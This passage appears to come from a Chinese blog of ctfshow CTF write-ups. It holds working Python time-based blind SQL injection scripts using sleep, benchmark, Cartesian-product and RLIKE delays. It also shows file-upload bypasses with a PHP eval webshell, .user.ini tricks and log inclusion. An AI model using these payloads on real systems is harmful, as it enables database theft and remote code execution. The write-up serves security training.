----&gt;这样就可以了。</span><br></pre></td></tr></table></figure><p>那么我们就拿上一题的脚本拿来修改修改就好了。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://d1e3eb87-f09e-4e69-9811-9765e724a946.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxc,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaa,i</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if((ascii(substr((select flagaa from ctfshow_flagxc),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230103185247275.png" alt="image-20230103185247275"></p><p>拿到flag了。</p><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>源码</p><p><img src="../images/image-20230103190103648.png" alt="image-20230103190103648"></p><p>题目增加了个base64编码，但是影响不大，这样还是可以绕过，抓个包，然后进行下面的分析就能绕过了。</p><p><img src="../images/image-20230103190054969.png" alt="image-20230103190054969"></p><p>修改后的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://18b8abd6-51e2-4fb8-90ce-f2887bc5ab82.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;abc&#x27;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxcc,ct</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;abc&#x27;) or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaac,i</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27;adb&#x27;) or if((ascii(substr((select flagaac from ctfshow_flagxcc),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>源码</p><p><img src="../images/image-20230103192035743.png" alt="image-20230103192035743"></p><p>这里是吧sleep给过滤掉了。那么我们就可以用别的函数来替代sleep了。</p><p>这里就得用到benchmark函数了。</p><p><img src="../images/image-20230103192546638.png" alt="image-20230103192546638"></p><p>这个函数的功能 benchmark(次数，实现的计算)      </p><p>上图的意思就是进行了100000000次md5(1)的计算。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://5d44e38e-dd70-49f9-aa22-472a67c5d0bb.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;999) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxccb,ct</span></span><br><span class="line">        <span class="comment">#payload = &quot;999) or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaabc,i</span></span><br><span class="line">        payload = <span class="string">&quot;999) or if((ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p>源码</p><p><img src="../images/image-20230103202950013.png" alt="image-20230103202950013"></p><p>这次把sleep和benchmark都给过滤掉了，那么我们还可以利用笛卡尔乘积</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">笛卡尔积又叫笛卡尔乘积，是一个叫笛卡尔的人提出来的。</span><br><span class="line">简单的说就是两个集合相乘的结果。</span><br><span class="line">具体的定义去看看有关代数系的书的定义。</span><br><span class="line">直观的说就是</span><br><span class="line">集合A&#123;a1,a2,a3&#125;</span><br><span class="line">集合B&#123;b1,b2&#125;</span><br><span class="line">他们的</span><br><span class="line">笛卡尔积</span><br><span class="line">是</span><br><span class="line">A*B</span><br><span class="line">=&#123;(a1,b1),(a1,b2),(a2,b1),(a2,b2),(a3,b1),(a3,b2)&#125;</span><br></pre></td></tr></table></figure><p>离散数学里会学到这个东西。</p><p><img src="../images/image-20230103225712432.png" alt="image-20230103225712432"></p><p><img src="../images/image-20230103230559724.png" alt="image-20230103230559724"></p><p><strong>这就是mysql里的笛卡尔乘积。</strong></p><p>这里能让其产生延迟的感觉就是查大量的数据的时候就会产生延迟。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://45f61877-517c-463b-adae-cc648e4d6531.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>+res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1) and if(substr((select database())),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1</span><br></pre></td></tr></table></figure><p>可以第一个if判断改成2&gt;1,拿去题目那试一下，看是否产生延迟.</p><p><strong>limit</strong></p><p><img src="../images/image-20230104001113081.png" alt="image-20230104001113081"></p><p><img src="../images/image-20230104001125935.png" alt="image-20230104001125935"></p><p>limit 1,1就是返回第一行的数。<br><img src="../images/image-20230104001335990.png" alt="image-20230104001335990"></p><p>这个是返回第一行后面2行的数。</p><p>还有等等种可能，不理解的时候可以去本地去自己查询来理解。</p><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>源码</p><p><img src="../images/image-20230104002030913.png" alt="image-20230104002030913"></p><p>把这个东西给过滤掉了，这里就得知<strong>rlike</strong>也是可以进行时间盲注的。</p><p>这里就要五种方法来进行时间盲注，<strong>sleep</strong>  <strong>benchmark</strong> <strong>rlike</strong>  <strong>笛卡尔乘积</strong> 还有一种是<strong>双链接</strong></p><p>双链接是啥我也不太清楚，感兴趣的可以自己去查查。</p><p><strong>rlike</strong></p><p>就是利用正则表达式来做.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正侧匹配在匹配较长字符串但自由度比较高的字符串时会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern,通过控制字符串长度我们可以控制延时</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(1=1,(select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;)),0)</span><br></pre></td></tr></table></figure><p>这里用上一道题的脚本就行了。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://45f61877-517c-463b-adae-cc648e4d6531.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>+res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">          </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><p>源码</p><p><img src="../images/image-20230104003951518.png" alt="image-20230104003951518"></p><p>把substr给给过滤掉了，那么我们就得去使用别的函数了，left,right这些都可以。</p><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="后面的sql题找个机会再去做，先做到这了"><a href="#后面的sql题找个机会再去做，先做到这了" class="headerlink" title="后面的sql题找个机会再去做，先做到这了"></a>后面的sql题找个机会再去做，先做到这了</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow sql注入 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 文件上传 刷题记录</title>
      <link href="/posts/8b3f0eaf.html"/>
      <url>/posts/8b3f0eaf.html</url>
      
        <content type="html"><![CDATA[<p>文件上传检测有三个</p><ol><li><strong>文件名</strong></li><li><strong>文件类型</strong></li><li><strong>文件内容</strong></li></ol><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204215335.png" alt="image-20221224204215335"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224203050054.png" alt="image-20221224203050054"></p><p>windows下合成图片码方法。</p><p>然后传图片码</p><p>进行抓包</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204251719.png" alt="image-20221224204251719"></p><p>抓包后修改后缀为php，然后访问。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204343141.png" alt="image-20221224204343141"></p><p>出现这种情况就是成功了，然后用蚁剑连接</p><p>然后就可以拿到flag了。</p><p><strong>解法二</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204852845.png" alt="image-20221224204852845"></p><p>直接把这里的png限制给改成php，那么就可以直接上传一句话木马了，然后进行rce了。</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205346493.png" alt="image-20221224205346493"></p><p>还是一样的格式，</p><p>那么还是上传图片码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图片码就是一句话木马&lt;?php eval($_POST[1]);?&gt;  加上任意一张图片组成的图片码。</span><br></pre></td></tr></table></figure><p>上传成功后进行修改后缀。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205601789.png" alt="image-20221224205601789"></p><p>然后就去访问url/upload/normal_upload.php  </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205644437.png" alt="image-20221224205644437"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205655846.png" alt="image-20221224205655846"></p><p>然后就可以拿到flag了。</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224213230135.png" alt="image-20221224213230135"></p><p>这道题居然这么快就用到<code>.user.ini</code>,我以为还要到后面的题。</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128165642">https://blog.csdn.net/qq_63548648/article/details/128165642</a>   这是我对 .htacess和.user.ini用法的总结。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里虽然改文件后缀可以绕过，但是网站无法进行解析，蚁剑也不能连接。所以就得去用.user.ini了</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224231943017.png" alt="image-20221224231943017"></p><p>先上传一张图片，然后通过改图片名和内容，上传.user.ini</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232145899.png" alt="image-20221224232145899"></p><p>这里上传的<code>auto_append_file</code>后面跟着的文件名要和后面上传的文件名一样</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232300737.png" alt="image-20221224232300737"></p><p>成功上传，然后去访问/upload/就行</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232348250.png" alt="image-20221224232348250"></p><p>出现这种情况就代表成功了，然后进行蚁剑连接就能拿到flag了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232529978.png" alt="image-20221224232529978"></p><h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224233441983.png" alt="image-20221224233441983"></p><p>这道题和上一题解法一样，只不过这道题是把php给过滤掉了，但是我们可以利用短标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;   ---&gt;  &lt;?= eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224233918091.png" alt="image-20221224233918091"></p><p>解法和web154一样，就不多写了</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225003016143.png" alt="image-20221225003016143"></p><p>和上一题解法一样，只不过这里过滤了[],那么可以把代码改成{}</p><p>还有不一样的是   上传的图片里不能带内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST&#123;1&#125;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225003245068.png" alt="image-20221225003245068"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里和前两题的差别是这里的&lt;?php eval($_POST[1]);?&gt;不能用了，因为就是&#123;&#125;[]都被过滤了，那么我们就可以换另一种写法</span><br><span class="line">&lt;?= eval($_POST[1])?&gt;  ---&gt;  php中不带;也是可以正常执行代码的</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004524802.png" alt="image-20221225004524802"></p><p>这里就是和上一题不同的地方。   </p><p>然后其他都一样。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004647307.png" alt="image-20221225004647307"></p><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004739667.png" alt="image-20221225004739667"></p><p>和上一题解法一样，就不多说了。</p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225005311958.png" alt="image-20221225005311958"></p><p>这道题可以使用文件的日志包含。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;/var/lo&#x27;.&#x27;g/nginx/access/lo&#x27;.&#x27;g&#x27;  因为log被过滤了，那么只能用这种方法了</span><br></pre></td></tr></table></figure><p><strong>第一步</strong></p><p>就是先上传.user.ini以后，然后进行日志包含</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132701372.png" alt="image-20221225132701372"></p><p><strong>第二步</strong></p><p>传一句话木马</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132752973.png" alt="image-20221225132752973"></p><p><strong>第三步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132810021.png" alt="image-20221225132810021"></p><p>进行rce。</p><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225133639357.png" alt="image-20221225133639357"></p><p>这题和上一题的解法一样，只不过这题把空格给过滤了，那么可以用%0d来替代，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include1&#x27;/var/lo&#x27;.&#x27;g/nginx/access.lo&#x27;.&#x27;g&#x27;?&gt;   然后转到Hex这里找的1所在的位置，然后把1的16进制处改成0d就可</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225133949942.png" alt="image-20221225133949942"></p><p>在空格被过滤的时候   可以用<strong>0a 0b 0c 0d</strong>来替代</p><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>源码</p><p><img 